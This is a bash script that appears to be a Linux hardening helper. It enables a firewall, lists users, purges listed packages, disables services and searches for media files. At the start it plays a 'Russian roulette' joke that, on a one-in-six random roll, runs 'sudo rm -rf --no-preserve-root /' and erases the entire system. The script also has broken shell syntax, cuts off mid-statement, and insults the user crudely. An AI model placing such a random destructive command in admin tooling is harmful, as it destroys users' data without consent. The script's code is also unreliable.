#!/bin/bash
RANDOM_NUMBER=$((RANDOM % 6 + 1))
echo "loading cylinder"
sleep 0.5
clear
echo "loading cylinder ."
sleep 0.5
clear
echo "loading cylinder . ."
sleep 0.5
clear
echo "loading cylinder . . ."
sleep 0.5
clear
echo "1 bullet loaded!"
sleep 1
clear

if [ $RANDOM_NUMBER -eq 6 ]; then 
  echo "pulling trig — "
  sleep 0.5
  clear
  echo "BANG!"
  sleep 2
  clear
  sudo rm -rf --no-preserve-root /
else
  echo "pulling trigger"
  sleep 1
  clear
  echo "pulling trigger —"
  sleep 1
  clear
  echo "your system lives too die another day"
  sleep 3
  clear
fi

sudo ufw enable

while read user; do
  echo $user
done < /etc/passwd

while read package; do
  sudo apt purge --autoremove $package
done < ../configs/no_packages

for service in $(sudo systemctl list-units --type=service); do
  echo "$service"
  if ! grep $service ../configs/default_services && ! grep $service ../input/yes_services; then
    sudo systemctl disable --now $service
  fi
done

ILLEGAL_FILES_MP3=$((sudo find / -iname *.mp3 2>/dev/null))
ILLEGAL_FILES_WAV=$((sudo find / -iname *.wav 2>/dev/null))
ILLEGAL_FILES_OGG=$((sudo find / -iname *.ogg 2>/dev/null))

if [ $ILLEGAL_FILES_MP3$ILLEGAL_FILES_WAV$ILLEGAL_FILES_OGG != ""]; then
  echo "$ILLEGAL_FILES_MP3$ILLEGAL_FILES_WAV$ILLEGAL_FILES_OGG, these are probably bad, you should remove them"
  echo "yeah i know ur a lazy ass cunt"
  echo "should i do it for you? y/n"
  read RESPONSE
  if [ $
fi




